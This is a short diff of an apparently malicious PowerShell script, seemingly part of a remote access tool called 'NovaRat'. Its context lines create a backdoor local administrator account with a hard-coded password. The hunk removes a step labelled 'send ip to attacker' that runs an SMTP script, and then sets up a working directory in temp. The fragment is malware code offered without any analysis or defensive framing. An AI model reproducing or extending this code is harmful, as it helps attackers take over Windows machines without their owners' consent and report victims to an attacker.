@@ -38,8 +38,6 @@ $NewLocalAdmin = "novarat"
 $Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
-#send ip to attacker
-./smtp.ps1
 #goto temp, make working direcrtory
 mkdir $path
 cd $path
